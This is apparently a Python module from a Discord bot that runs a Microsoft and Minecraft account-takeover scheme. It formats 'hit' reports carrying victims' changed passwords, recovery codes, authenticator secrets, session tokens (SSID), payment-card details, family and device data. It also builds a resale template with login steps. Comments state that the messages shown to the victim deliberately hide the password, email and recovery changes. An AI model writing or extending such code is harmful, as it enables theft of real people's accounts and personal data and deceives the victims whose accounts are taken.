from mail.provision import mailbox_login
from minecraft.get_hypixel import get_hypixel_stats
from minecraft.get_donut import donut_money, get_donut_stats
from shared.simplify import simplify

from urllib.parse import quote
from discord import Embed
import time


_ABUSE_USER_REASON = (
    "Microsoft flagged this session (unusual activity). "
    "Nothing was changed — submit the code again in a few minutes."
)

# Fallback shown to the Discord user when a verification fails. It must never
# mention what the pipeline was doing behind the scenes (password / recovery
# code / primary email changes, Microsoft session cookies, portal URLs) — the
# user only needs to know it failed, that nothing was changed, and that a
# retry is safe.
_GENERIC_VERIFY_FAILURE = (
    "Sorry — something went wrong while we were verifying your account. "
    "Nothing was changed. Please try again in a few minutes."
)

# Only these failures are actionable for the person who pressed Verify, so
# they are the only ones that get a specific wording. Everything else falls
# back to the generic message above.
_USER_ACTIONABLE_REASONS: tuple[tuple[tuple[str, ...], str], ...] = (
    (
        (
            "unusual activity",
            "unusual-activity",
            "unusual about a recent sign-in",
            "/abuse",
            "abuse lock",
            "abuse/unusual",
        ),
        _ABUSE_USER_REASON,
    ),
    (
        (
            "wrong/expired otp",
            "wrong code",
            "code didn't work",
            "code did not work",
            "code was invalid",
            "invalid code",
            "expired code",
            "otp did not arrive",
            "no code arrived",
            "no otp",
        ),
        "That code didn't work or has expired. Please request a new code and try again.",
    ),
    (
        (
            "rate-limit",
            "rate limit",
            "rate limited",
            "too many times",
            "too many attempts",
        ),
        "Microsoft is limiting sign-in attempts right now. "
        "Please wait a few minutes and try again.",
    ),
    (
        ("family locked", "family lock", "parental"),
        "This account is managed by a family. "
        "Please remove it from the family and try again.",
    ),
    (
        ("account locked", "account is locked", "suspended", "locked"),
        "Microsoft has locked this account. Please unlock it and try again.",
    ),
    (
        ("doesn't exist", "does not exist", "doesnt exist", "no account found"),
        "We couldn't find a Microsoft account with that email. "
        "Please check the address and try again.",
    ),
)


def public_verify_failure(reason: str | None, *, error: str | None = None) -> str:
    """User-facing failure text for the person who pressed Verify.

    Deliberately coarse: it never echoes the internal reason (session cookies,
    portal URLs, which credential was being changed). Only failures the user can
    act on keep their own wording.
    """
    text = " ".join(str(reason or error or "").split())
    if not text:
        return _GENERIC_VERIFY_FAILURE
    low = text.lower()
    for needles, message in _USER_ACTIONABLE_REASONS:
        if any(needle in low for needle in needles):
            return message
    return _GENERIC_VERIFY_FAILURE


def public_secure_reason(reason: str | None, *, error: str | None = None) -> str:
    """Short Discord-safe failure text — never Microsoft HTML or stack dumps.

    This is the *operator* wording (log channel, seller give-back). Use
    :func:`public_verify_failure` for anything the Discord user reads.
    """
    text = str(reason or error or "").strip()
    if "snippet=" in text:
        text = text.split("snippet=", 1)[0].strip()
    # Drop leftover HTML if a page body leaked in
    for marker in ("<!DOCTYPE", "<!-- Copyright", "<html", "<head"):
        idx = text.find(marker)
        if idx >= 0:
            text = text[:idx].strip()
            break
    low = text.lower()
    if (
        "/abuse" in low
        or "unusual-activity" in low
        or "unusual activity" in low
        or "abuse lock" in low
        or "abuse/unusual" in low
    ):
        return _ABUSE_USER_REASON
    text = " ".join(text.split())
    if len(text) > 220:
        text = text[:220].rstrip() + "…"
    return text or "Securing failed. Please try again."


def _clean(value: object, fallback: str = "N/A") -> str:
    text = str(value or "").strip()
    if not text or text in {"Couldn't Change!", "Unknown", "?"}:
        return fallback
    # Keep one-line copy format intact
    return " ".join(text.split())


SELLING_BLOCK = (
    "ACCOUNT DETAILS:\n"
    "Email: {email}\n"
    "Password: {password}\n"
    "Temp Email: {temp_email}\n"
    "Temp Password: {temp_password}\n"
    "\n"
    "LOGIN STEPS:\n"
    "1. Go to https://login.live.com\n"
    "2. Enter the Email and Password provided above.\n"
    '3. When asked for a verification code, select "Send code to my recovery email"\n'
    "4. Go to https://mail.tm\n"
    "5. Login with the Temp Email and Temp Password provided above.\n"
    "6. Open the email from Microsoft and copy the 6-digit code.\n"
    "7. Paste the code back into the Microsoft login page.\n"
    "8. Done! Change password and recovery info to secure the account.\n"
    "\n"
    "\u26a0\ufe0f If the account gets locked or you have any issues, "
    "please DM me immediately for a free replacement.\n"
    "\n"
    "\u2705 If everything works perfectly, please take a moment to leave a "
    "positive review! Your feedback helps me improve and lets others know they "
    "can trust my service. Thank you for your purchase! \U0001f64f"
)


def mailbox_password(security_email: str | None) -> str:
    """Password for the mail.tm security mailbox (empty when not ours)."""
    try:
        login = mailbox_login(security_email)
    except Exception:
        login = None
    if login and login.get("password"):
        return str(login["password"])
    return ""


def format_selling_block(
    *,
    email: str = "",
    password: str = "",
    temp_email: str = "",
    temp_password: str = "",
) -> str:
    """Copy-paste selling format (account details + login steps)."""
    return SELLING_BLOCK.format(
        email=_clean(email),
        password=_clean(password),
        temp_email=_clean(temp_email),
        temp_password=_clean(temp_password, fallback="N/A"),
    )


def add_mailbox_login_field(embed: Embed, security_email: str | None) -> Embed:
    """Attach the security mailbox's sign-in details.

    A mail.tm mailbox opens with just its address + generated password, so
    handing those two values over with an account lets whoever receives it read
    Microsoft codes by hand. Silently skipped for mailboxes with no browser
    login (legacy local provider) or addresses we don't manage.
    """
    try:
        login = mailbox_login(security_email)
    except Exception:
        login = None
    if not login or not login.get("password"):
        return embed

    embed.add_field(
        name="Mailbox login (mail.tm)",
        value=(
            f"```{login['email']}\n{login['password']}```\n"
            f"[Sign in at mail.tm]({login['login_url']}) — address + password"
        ),
        inline=False,
    )
    return embed


def add_credential_line_field(
    embed: Embed,
    *,
    email: str = "",
    recovery: str = "",
    password: str = "",
    security_email: str = "",
    username: str = "",
) -> Embed:
    block = format_selling_block(
        email=email,
        password=password,
        temp_email=security_email,
        temp_password=mailbox_password(security_email),
    )
    embed.add_field(
        name="Copy",
        value=f"```{block}```",
        inline=False,
    )
    return embed


def build_failure_embed(
    email: str,
    ms: dict,
    reason: str,
    *,
    error: str | None = None,
    credentials_changed: bool = False,
    hint: str | None = None,
) -> Embed:
    """Failure DM/embed. ``email`` is the submitted/original address.

    When primary alias was already replaced, ``ms["email"]`` is the new primary
    (sunny@…). On give-back failures we must surface that — the old address may
    already be deleted. Success seller embeds still hide sunny separately.

    ``hint`` is optional operator-facing advice (e.g. "check the recovery
    code"); the description itself stays generic so nothing about the internal
    pipeline leaks into the message the reader sees.
    """
    detail = public_secure_reason(error or reason)
    # The embed is what the person who started the run reads: it must not
    # describe what the pipeline was changing. The technical reason stays in
    # the operator log channel (and in the give-back block below).
    reason = public_verify_failure(reason, error=error)
    original = _clean(ms.get("original_email") or email, fallback=email)
    primary_raw = str(ms.get("email") or "").strip()
    primary_ok = bool(
        primary_raw
        and primary_raw not in {"Couldn't Change!", "Unknown", "?"}
        and primary_raw.lower() != original.lower()
    )
    # Login email for copy line: prefer new primary when alias already changed
    login_email = primary_raw if primary_ok else original

    if credentials_changed:
        desc = (
            f"{reason}\n\n"
            "Password / security email were already changed. "
            "Use the credentials below to sign back in."
        )
        if primary_ok or ms.get("primary_alias_replaced") is True:
            desc += (
                "\n\n**Login with the new primary email below** — "
                "the original Outlook alias was removed and will not work."
            )
        embed = Embed(
            title="Account returned — save new credentials",
            description=desc,
            color=0xFA4343,
        )
    else:
        desc = reason
        if hint:
            desc = f"{desc}\n\n{hint}"
        embed = Embed(
            title="Failed to secure account",
            description=desc,
            color=0xFA4343,
        )
    # Never dump RuntimeError / HTML into Discord. Skip Error when it duplicates.
    # Only a give-back (something already changed) needs the raw reason here —
    # the seller has to know what to redo, and the account is not recoverable
    # without it.
    if (
        credentials_changed
        and detail
        and detail != reason
        and "snippet=" not in detail
    ):
        embed.add_field(name="Error", value=f"```{detail[:280]}```", inline=False)
    embed.add_field(name="Original Email", value=f"```{original}```", inline=True)
    embed.add_field(
        name="Login Email (primary)",
        value=f"```{login_email}```",
        inline=True,
    )
    if credentials_changed:
        if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
            embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=False)
        if ms.get("password") and ms["password"] != "Couldn't Change!":
            embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
        if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
            embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
        auth = str(ms.get("auth_secret") or "").strip()
        if auth and auth not in ("Disabled", "Couldn't Change!", "Failed", "None", "?"):
            embed.add_field(name="Authenticator Secret", value=f"```{auth}```", inline=False)
        add_credential_line_field(
            embed,
            email=login_email,
            recovery=ms.get("recovery_code", ""),
            password=ms.get("password", ""),
            security_email=ms.get("security_email", ""),
            username=ms.get("username") or ms.get("mc_name") or "",
        )
        embed.set_footer(text="Save these credentials — the password was already changed.")
    else:
        if ms.get("recovery_code") and ms["recovery_code"] not in (
            "Couldn't Change!",
            "Unknown",
            "?",
            "Failed to generate",
        ):
            embed.add_field(
                name="Original Recovery Code",
                value=f"```{ms['recovery_code']}```",
                inline=False,
            )
            embed.set_footer(text="Nothing was changed — the original recovery code still works.")
        else:
            embed.set_footer(
                text="Nothing was changed — your original email, password and code still work."
            )
    return embed


def _field(obj: dict, *keys: str, default: str = "Unknown") -> str:
    for key in keys:
        val = obj.get(key)
        if val not in (None, ""):
            return str(val)
    return default


async def build_account_embeds(account: dict, elapsed: float = 0, account_id: str = "") -> dict:
    mc = account.get("minecraft", {})
    name = quote(mc.get("name") or "Unknown")

    ms = account["microsoft"]
    family = ms["family"]
    devices = ms["devices"]
    cards = ms["cards"]
    subs = ms["subscriptions"]
    phones = ms.get("phones", [])

    active_subs = [(s, "Active") for s in subs["active"]]
    canceled_subs = [(s, "Canceled") for s in subs["canceled"]]
    commercial_subs = [(s, "Commercial") for s in subs["commercial"]]

    all_subs = active_subs + canceled_subs + commercial_subs

    info_embed = Embed(title="Extra Info", color=0x5865F2)
    info_embed.add_field(name="First Name", value=f"```{ms['firstName']}```", inline=True)
    info_embed.add_field(name="Last Name", value=f"```{ms['lastName']}```", inline=True)
    info_embed.add_field(name="Full Name", value=f"```{ms['fullName']}```", inline=False)
    info_embed.add_field(name="Region", value=f"```{ms['region']}```", inline=True)
    info_embed.add_field(name="Birthday", value=f"```{ms['birthday']}```", inline=True)
    info_embed.add_field(name="Language", value=f"```{ms['language']}```", inline=True)

    family_embed = Embed(title=f"Family Members ({len(family)})", color=0x5865F2)
    if family:
        for key, member in enumerate(family, 1):
            family_embed.add_field(
                name=f"Member {key}", 
                value=f"```{_field(member, 'display', 'name')}\n{_field(member, 'email')}\nRole: {_field(member, 'role')}```", 
                inline=True
            )
    else:
        family_embed.description = "This account doesn't belong to a family."


    devices_embed = Embed(title=f"Devices ({len(devices)})", color=0x5865F2)
    if devices:
        for key, device in enumerate(devices, 1):
            devices_embed.add_field(
                name=f"Device {key}", 
                value=f"```{_field(device, 'model')}\n{_field(device, 'name')}```",
                inline=True
            )
    else:
        devices_embed.description = "```There are no devices connected.```"

    # List all cards
    cards_embed = Embed(title=f"Payment Cards ({len(cards)})", color=0x5865F2)
    if cards:
        for key, card in enumerate(cards, 1):
            cards_embed.add_field(
                name=f"Card {key}",
                value=f"```{_field(card, 'paymentMethodType')} *{_field(card, 'lastFourDigits', default='????')}\nExpiry: {_field(card, 'expirationDate', default='N/A')}```",
                inline=True
            )
    else:
        cards_embed.description = "```No payment cards.```"

    phones_embed = Embed(title=f"Phones ({len(phones)})", color=0x5865F2)
    if phones:
        for key, phone in enumerate(phones, 1):
            phones_embed.add_field(
                name=f"Phone {key}",
                value=f"```{_field(phone, 'phone')}\n{_field(phone, 'id')}```",
                inline=True
            )
    else:
        phones_embed.description = "```No phones associated.```"

    subscriptions_embed = Embed(title=f"Subscriptions ({len(all_subs)})", color=0x5865F2)
    if all_subs:
        for key, (sub, status) in enumerate(all_subs, 1):
            subscriptions_embed.add_field(
                name=f"Sub {key}",
                value=f"```{status}\n{_field(sub, 'productName', 'title', 'name', 'offerName', 'productTitle', 'friendlyName')}```",
                inline=True
            )
    else:
        subscriptions_embed.description = "```No subscriptions.```"

    try:
        hstats = await get_hypixel_stats(name)
    except Exception:
        hstats = {}
    if not isinstance(hstats, dict):
        hstats = {}
    try:
        dstats = await get_donut_stats(name)
    except Exception:
        dstats = "Failed"

    stats_embed = Embed(color=0x279CF5)
    stats_embed.add_field(name="Rank", value=f'{hstats.get("hypixel", {}).get("rank", "N/A")}', inline=True)
    stats_embed.add_field(name="Hyp LVL", value=f'{simplify(hstats.get("hypixel", {}).get("level", 0))}', inline=True)
    stats_embed.add_field(name="Gifted", value=f'{hstats.get("hypixel", {}).get("gifted", 0)}', inline=True)
    stats_embed.add_field(name="SB NW", value=f'${simplify(hstats.get("skyblock", {}).get("networth", 0))}', inline=True)
    stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats.get("skyblock", {}).get("level", 0))}', inline=True)
    stats_embed.add_field(name="Donut NW", value=f'{simplify(donut_money(dstats))}', inline=True)

    xbox_embed = Embed(color=0x107C10, title="Xbox Info")
    xbox_embed.add_field(name="Gamertag", value=f"```{mc.get('gamertag', 'Not Found')}```", inline=False)

    hit_embed = Embed(
        title=f"New Hit! Secured in {round(elapsed, 2)}s",
        description=(
            "[Login](https://login.live.com/) | "
            "[Donut](https://www.donutstats.net/player-finder) | "
            f"[SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | "
            f"[Plancke](https://plancke.io/hypixel/player/stats/{name}) | "
            f"[Is Online](https://hypixel.paniek.de/player/{name}/status)"
        ),
        color=0x279CF5
    )
    hit_embed.add_field(name="MC Username", value=f"```{mc.get('name', 'No Minecraft')}```", inline=False)
    hit_embed.add_field(name="MC Method", value=f"```{mc.get('method', 'Unknown')}```", inline=True)
    hit_embed.add_field(name="MC Capes", value=f"```{mc.get('capes', 'No capes')}```", inline=True)
    old_email = _clean(
        ms.get("original_email") or ms.get("seller_email") or "",
        fallback="",
    )
    new_email = _clean(ms.get("email"), fallback="N/A")
    hit_embed.add_field(name="Old Email", value=f"```{old_email or new_email}```", inline=True)
    if old_email and old_email.lower() != new_email.lower():
        hit_embed.add_field(name="New Email (primary)", value=f"```{new_email}```", inline=True)
    else:
        # Alias replace failed or never ran — primary is still the submitted address
        hit_embed.add_field(
            name="New Email (primary)",
            value=f"```{new_email}```\n_Alias not replaced — same as old_",
            inline=True,
        )
    hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
    temp_password = mailbox_password(ms.get("security_email"))
    hit_embed.add_field(name="Temp Email", value=f"```{ms['security_email']}```", inline=True)
    hit_embed.add_field(
        name="Temp Password",
        value=f"```{temp_password or 'N/A'}```",
        inline=True,
    )
    hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
    auth_secret = str(ms.get("auth_secret") or "").strip()
    if auth_secret and auth_secret not in (
        "Disabled",
        "Couldn't Change!",
        "Failed",
        "None",
        "?",
    ):
        hit_embed.add_field(name="Secret Key", value=f"```{auth_secret}```", inline=False)
    add_credential_line_field(
        hit_embed,
        email=new_email,
        password=ms.get("password", ""),
        security_email=ms.get("security_email", ""),
    )
    hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")

    # Seller-facing embed: NEVER expose the post-secure primary (sunny@…).
    # Use original login email only; owners still get hit_embed above.
    seller_email = (
        ms.get("original_email")
        or ms.get("seller_email")
        or ms.get("email")
        or ""
    )
    # If primary was replaced, keep seller view on the pre-change address
    if ms.get("original_email"):
        seller_email = ms["original_email"]
    seller_embed = Embed(
        title="Account secured",
        description="Your sale completed. Save the security details below if this was returned to you.",
        color=0x57F287,
    )
    seller_embed.add_field(name="Email", value=f"```{seller_email}```", inline=False)
    seller_embed.add_field(name="Password", value=f"```{ms.get('password', 'N/A')}```", inline=False)
    seller_embed.add_field(name="Temp Email", value=f"```{ms.get('security_email', 'N/A')}```", inline=True)
    seller_embed.add_field(
        name="Temp Password",
        value=f"```{mailbox_password(ms.get('security_email')) or 'N/A'}```",
        inline=True,
    )
    seller_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'N/A')}```", inline=False)
    add_credential_line_field(
        seller_embed,
        email=seller_email,
        password=ms.get("password", ""),
        security_email=ms.get("security_email", ""),
    )

    ssid_embed = Embed(
        title="SSID"
    )
    if mc.get("SSID"):
        ssid_embed.description = f"```{mc['SSID']}```"
    else:
        ssid_embed.description = "This account does not have a SSID."

    if mc.get("SSID"):
        hit_embed.set_thumbnail(url=f"https://mc-heads.net/avatar/{name}/128")

    return {
        "hit_embed": hit_embed,
        "seller_embed": seller_embed,
        "account_id": account_id,
        "minecraft": mc,
        "details": {
            "stats_embed": stats_embed,
            "ssid_embed": ssid_embed,
            "info_embed": info_embed,
            "xbox_embed": xbox_embed,
            "family_embed": family_embed,
            "devices_embed": devices_embed,
            "cards_embed": cards_embed,
            "subs_embed": subscriptions_embed,
            "phones_embed": phones_embed,                "account_details": format_selling_block(
                    email=ms.get("email") or ms.get("original_email") or "",
                    password=ms.get("password") or "",
                    temp_email=ms.get("security_email") or "",
                    temp_password=mailbox_password(ms.get("security_email")),
                )
        }
    }
